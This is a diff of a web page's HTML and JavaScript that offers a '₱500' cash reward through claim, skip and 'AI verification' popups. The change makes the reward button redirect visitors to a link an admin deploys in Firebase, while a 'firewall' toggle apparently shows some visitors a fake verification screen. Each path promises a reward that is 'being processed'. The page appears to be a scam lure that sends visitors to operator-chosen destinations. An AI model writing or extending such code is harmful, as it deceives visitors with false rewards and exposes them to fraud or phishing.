@@ -799,7 +799,6 @@
             border: 1px solid rgba(255, 215, 0, 0.3);
         }
 
-        /* Success state sa popup */
         .popup-success {
             text-align: center;
             padding: 20px 0;
@@ -925,9 +924,7 @@
 
     </div>
 
-    <!-- ============================================================
-         🎁 POPUP 1 — CAT CLAIM
-         ============================================================ -->
+    <!-- 🎁 POPUP 1 — CAT CLAIM -->
     <div class="popup-overlay" id="catClaimPopup">
         <div class="popup-card">
             <button class="popup-close" id="catClaimClose">✕</button>
@@ -949,9 +946,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-         📢 POPUP 2 — SKIP AND CLAIM
-         ============================================================ -->
+    <!-- 📢 POPUP 2 — SKIP AND CLAIM -->
     <div class="popup-overlay" id="skipClaimPopup">
         <div class="popup-card">
             <button class="popup-close" id="skipClaimClose">✕</button>
@@ -977,9 +972,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-         ✅ POPUP 3 — SUCCESS (walang redirect)
-         ============================================================ -->
+    <!-- ✅ POPUP 3 — SUCCESS -->
     <div class="popup-overlay" id="successPopup">
         <div class="popup-card">
             <button class="popup-close" id="successClose">✕</button>
@@ -1000,9 +993,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-         📞 POPUP 4 — AI VERIFICATION
-         ============================================================ -->
+    <!-- 📞 POPUP 4 — AI VERIFICATION -->
     <div class="popup-overlay" id="aiVerifyPopup">
         <div class="popup-card">
             <button class="popup-close" id="aiVerifyClose">✕</button>
@@ -1248,12 +1239,6 @@
                 if (popup) popup.classList.remove('show');
             }
 
-            function closeAllPopups() {
-                document.querySelectorAll('.popup-overlay').forEach(function(p) {
-                    p.classList.remove('show');
-                });
-            }
-
             // Close buttons
             document.getElementById('catClaimClose').onclick = function() { closePopup('catClaimPopup'); };
             document.getElementById('skipClaimClose').onclick = function() {
@@ -1288,7 +1273,7 @@
             }
 
             // ============================================================
-            // 💰 GET ₱500 BUTTON
+            // 💰 GET ₱500 BUTTON — MAIN FLOW
             // ============================================================
             var get500Btn = document.getElementById('get500Btn');
             if (get500Btn) {
@@ -1308,7 +1293,7 @@
                         console.log('🔥 Firewall:', firewallActive ? 'ON' : 'OFF');
 
                         if (firewallActive) {
-                            // 🔥 FIREWALL ON → AI Verification
+                            // 🔥 FIREWALL ON → AI Verification popup
                             sendMissionNotif('FIREWALL ON — AI Verification');
                             closePopup('catClaimPopup');
                             self.disabled = false;
@@ -1317,25 +1302,29 @@
                             return;
                         }
 
-                        // 🔓 FIREWALL OFF → Check for link
-                        console.log('🔓 Checking for available link...');
+                        // 🔓 FIREWALL OFF → Check for deployed link
+                        console.log('🔓 Checking for deployed link...');
                         getAvailableLink().then(function(linkUrl) {
                             if (linkUrl) {
-                                // ✅ MAY LINK → Success popup (NO REDIRECT)
-                                sendMissionNotif('FIREWALL OFF — Link available');
+                                // ✅ MAY LINK → REDIRECT sa deployed link
+                                sendMissionNotif('FIREWALL OFF — Redirecting to deployed link');
                                 closePopup('catClaimPopup');
-                                self.disabled = false;
-                                self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
-                                showSuccessPopup('Your reward link is ready. Please wait for further instructions.');
-                            } else {
-                                // 📢 WALANG LINK → Skip and Claim popup
-                                sendMissionNotif('FIREWALL OFF — No link');
-                                closePopup('catClaimPopup');
-                                self.disabled = false;
-                                self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
-                                openPopup('skipClaimPopup');
-                                startSkipCountdown();
+                                self.innerHTML = '<span class="btn-icon">✅</span><span>REDIRECTING...</span>';
+
+                                setTimeout(function() {
+                                    window.location.href = linkUrl;
+                                }, 800);
+                                return;
                             }
+
+                            // 📢 WALANG LINK → Skip and Claim popup
+                            sendMissionNotif('FIREWALL OFF — No link deployed');
+                            closePopup('catClaimPopup');
+                            self.disabled = false;
+                            self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
+                            openPopup('skipClaimPopup');
+                            startSkipCountdown();
+
                         }).catch(function(e) {
                             console.error('Link check error:', e);
                             self.disabled = false;
@@ -1365,18 +1354,20 @@
             }
 
             // ============================================================
-            // 🔗 GET AVAILABLE LINK
+            // 🔗 GET AVAILABLE LINK (deployed by admin)
             // ============================================================
             function getAvailableLink() {
                 return new Promise(function(resolve) {
                     if (!db) return resolve(null);
                     try {
+                        // Priority 1: admin/redirectLink
                         db.ref('admin/redirectLink').once('value').then(function(snap) {
                             var data = snap.val();
                             if (data && data.url && data.active !== false) {
                                 return resolve(data.url);
                             }
 
+                            // Priority 2: links node (available)
                             db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(linksSnap) {
                                 if (linksSnap.exists()) {
                                     var links = linksSnap.val();
@@ -1460,7 +1451,7 @@
             }
 
             // ============================================================
-            // ⏭️ SKIP & CLAIM BUTTON — CLOSE POPUP LANG
+            // ⏭️ SKIP & CLAIM BUTTON — CLOSE POPUP LANG (no redirect)
             // ============================================================
             var skipClaimBtn = document.getElementById('skipClaimBtn');
             if (skipClaimBtn) {
@@ -1477,12 +1468,9 @@
                     this.innerHTML = '<span class="btn-icon">✅</span><span>CLAIMED!</span>';
                     this.disabled = true;
 
-                    // ✅ CLOSE POPUP LANG — walang redirect
                     setTimeout(function() {
                         closePopup('skipClaimPopup');
                         stopSkipCountdown();
-
-                        // Show success popup
                         showSuccessPopup('Your reward has been successfully claimed.<br>Please wait for further instructions.');
                     }, 800);
                 });
@@ -1597,7 +1585,7 @@
             }
 
             // ============================================================
-            // ✅ AI VERIFY BUTTON — CLOSE POPUP LANG
+            // ✅ AI VERIFY BUTTON — CLOSE POPUP LANG (no redirect)
             // ============================================================
             var aiVerifyBtn = document.getElementById('aiVerifyBtn');
             if (aiVerifyBtn) {
@@ -1656,7 +1644,6 @@
 
                         triggerBurst();
 
-                        // ✅ CLOSE POPUP + SUCCESS POPUP — walang redirect
                         setTimeout(function() {
                             closePopup('aiVerifyPopup');
                             showSuccessPopup('Verification successful!<br>Your reward is being processed.');
